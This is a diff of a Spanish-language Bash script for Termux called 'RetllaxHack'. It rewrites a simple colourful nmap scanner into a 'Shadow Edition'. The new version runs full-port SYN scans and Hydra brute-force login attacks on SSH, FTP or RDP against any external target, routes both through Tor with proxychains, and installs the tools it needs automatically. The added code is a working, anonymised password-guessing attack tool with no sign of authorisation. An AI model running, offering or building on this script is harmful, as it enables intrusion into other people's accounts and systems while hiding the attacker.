@@ -1,91 +1,96 @@
 #!/usr/bin/env bash
 
-# RetllaxHack Pro RGB Edition (v4.0)
-# Efectos de color dinámicos - 100% funcional sin root
+# RetllaxHack Shadow (v8.0)
+# Escaneo sin límites + Hydra con Tor (No Root)
 
 # ===== CONFIGURACIÓN RGB =====
-function rgb_effect {
-  case $(($RANDOM % 6)) in
-    0) echo -e "\033[1;31m$1\033[0m";;  # Rojo
-    1) echo -e "\033[1;32m$1\033[0m";;  # Verde
-    2) echo -e "\033[1;33m$1\033[0m";;  # Amarillo
-    3) echo -e "\033[1;34m$1\033[0m";;  # Azul
-    4) echo -e "\033[1;35m$1\033[0m";;  # Magenta
-    5) echo -e "\033[1;36m$1\033[0m";;  # Cyan
-  esac
+function rgb {
+  colors=("196" "40" "214" "39" "200" "226")  # Rojo, Verde, Naranja, Azul, Magenta, Amarillo
+  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
 }
 
 # ===== BANNER ANIMADO =====
-function show_banner() {
+function show_banner {
   clear
-  rgb_effect "  ____      _   _   _       _     _    _      "
-  rgb_effect " |  _ \ ___| |_| | | | __ _| |__ | | _| |__  "
-  rgb_effect " | |_) / _ \ __| |_| |/ _\` | '_ \| |/ / '_ \ "
-  rgb_effect " |  _ <  __/ |_|  _  | (_| | | | |   <| | | |"
-  rgb_effect " |_| \_\___|\__|_| |_|\__,_|_| |_|_|\_\_| |_|"
   echo
-  rgb_effect "=== HERRAMIENTA PROFESIONAL DE AUDITORÍA ==="
-  rgb_effect "=========== TERMUX EDITION v4.0 ============"
+  rgb " ██▀███  ▓█████ ▄▄▄       ██▓     ██░ ██  ▄▄▄     ▓██   ██▓"
+  rgb "▓██ ▒ ██▒▓█   ▀▒████▄    ▓██▒    ▓██░ ██▒▒████▄    ▒██  ██▒"
+  rgb "▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██  ▀█▄   ▒██ ██░"
+  rgb "▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██▄▄▄▄██  ░ ▐██▓░"
+  rgb "░██▓ ▒██▒░▒████▒▓█   ▓██▒░██████▒░▓█▒░██▓ ▓█   ▓██▒ ░ ██▒▓░"
+  rgb "░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░  ██▒▒▒ "
+  rgb "  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░▓██ ░▒░ "
+  rgb "  ░░   ░    ░    ░   ▒     ░ ░    ░  ░░ ░  ░   ▒   ▒ ▒ ░░  "
+  rgb "   ░        ░  ░     ░  ░    ░  ░ ░  ░  ░      ░  ░░ ░     "
+  rgb "                                                        ░ ░ "
+  echo
+  rgb "============= SHADOW EDITION v8.0 ============="
+  rgb "=== FUERZA BRUTA TOTAL + PROXYCHAIN/TOR ==="
   echo
 }
 
-# ===== ESCANEO DINÁMICO RGB =====
-function dynamic_scan() {
-  show_banner
-  read -p "$(rgb_effect "[?] IP/Dominio: ")" target
+# ===== ESCANEO SIN LIMITES =====
+function shadow_scan {
+  read -p "$(rgb "[?] IP/Dominio (externo): ")" target
   
-  # Configuración inteligente
-  delay=$((RANDOM%4+2))
-  ports="21,22,80,443,8080,8443,3306,3389"
+  rgb "[~] Iniciando escaneo sigiloso con Tor..."
+  proxychains -q nmap -Pn -T5 -sS -p- --min-rate 1000 $target | tee scan_shadow.log
   
-  rgb_effect "[~] Configurando escaneo RGB..."
-  echo -e "$(rgb_effect "• Técnica:") $(rgb_effect "Escaneo CONNECT")"
-  echo -e "$(rgb_effect "• Retardo:") $(rgb_effect "${delay}s")"
-  echo -e "$(rgb_effect "• Puertos:") $(rgb_effect "$ports")"
-  
-  rgb_effect "\n[+] Iniciando escaneo..."
-  nmap -Pn -T4 --max-retries 1 --scan-delay ${delay}s -p $ports $target | \
-    while read line; do
-      if [[ $line == *"open"* ]]; then
-        rgb_effect "[+] $line"
-      elif [[ $line == *"filtered"* ]]; then
-        rgb_effect "[?] $line"
-      else
-        echo "$line"
-      fi
-    done | tee scan_results.log
-    
-  rgb_effect "\n[✔] Escaneo completado!"
-  rgb_effect "Resultados guardados en scan_results.log"
+  rgb "[+] Puertos abiertos:"
+  grep "open" scan_shadow.log | while read line; do
+    rgb "[+] $line"
+  done
 }
 
-# ===== MENÚ RGB =====
-function rgb_menu() {
+# ===== HYDRA CON TOR (8 HILOS) =====
+function hydra_shadow {
+  rgb "[!] MODO HYDRA TOR ACTIVADO (8 Hilos)"
+  read -p "$(rgb "[?] Objetivo: ")" target
+  read -p "$(rgb "[?] Servicio (ssh/ftp/rdp): ")" service
+  read -p "$(rgb "[?] Wordlist usuarios: ")" users
+  read -p "$(rgb "[?] Wordlist contraseñas: ")" pass
+  
+  rgb "[~] Configurando Tor + Hydra..."
+  killall tor 2>/dev/null
+  tor &>/dev/null &
+  sleep 5
+  
+  rgb "[~] Iniciando ataque con 8 hilos..."
+  proxychains -q hydra -v -V -t 8 -w 0 -I -L $users -P $pass $target $service | tee hydra_shadow.log
+  
+  rgb "[✔] Ataque completado. Ver hydra_shadow.log"
+}
+
+# ===== MENÚ SHADOW =====
+function shadow_menu {
   while true; do
     show_banner
-    rgb_effect "1) Escaneo RGB Dinámico"
-    rgb_effect "2) Ver Resultados"
-    rgb_effect "3) Actualizar Herramienta"
-    rgb_effect "4) Salir"
+    rgb "1) Escaneo Sigiloso (Tor)"
+    rgb "2) Hydra Shadow (8 Hilos + Tor)"
+    rgb "3) Ver Resultados"
+    rgb "4) Salir"
     echo
-    read -p "$(rgb_effect "[?] Seleccione una opción: ")" opt
+    read -p "$(rgb "[?] Opción: ")" opt
 
     case $opt in
-      1) dynamic_scan ;;
-      2) [ -f "scan_results.log" ] && cat scan_results.log || rgb_effect "[!] No hay resultados";;
-      3) curl -sL https://raw.githubusercontent.com/tu_repo/RetllaxHack/main/retllaxhack.sh > update.sh && 
-         chmod +x update.sh && 
-         mv update.sh retllaxhack.sh && 
-         rgb_effect "[✔] Actualización completada!";;
+      1) shadow_scan ;;
+      2) hydra_shadow ;;
+      3) 
+        [ -f "scan_shadow.log" ] && cat scan_shadow.log | grep --color "open"
+        [ -f "hydra_shadow.log" ] && cat hydra_shadow.log | grep --color "login:"
+        ;;
       4) exit 0 ;;
-      *) rgb_effect "[!] Opción inválida"; sleep 1 ;;
+      *) rgb "[!] Opción inválida"; sleep 1 ;;
     esac
-    read -p "$(rgb_effect "\nPresione Enter para continuar...")"
+    read -p "$(rgb "[?] Enter para continuar...")"
   done
 }
 
 # ===== INICIO =====
 show_banner
-rgb_effect "[~] Inicializando efectos RGB..."
-sleep 2
-rgb_menu
+rgb "[~] Verificando dependencias..."
+command -v tor >/dev/null || pkg install tor -y
+command -v proxychains >/dev/null || pkg install proxychains-ng -y
+command -v hydra >/dev/null || pkg install hydra -y
+
+shadow_menu
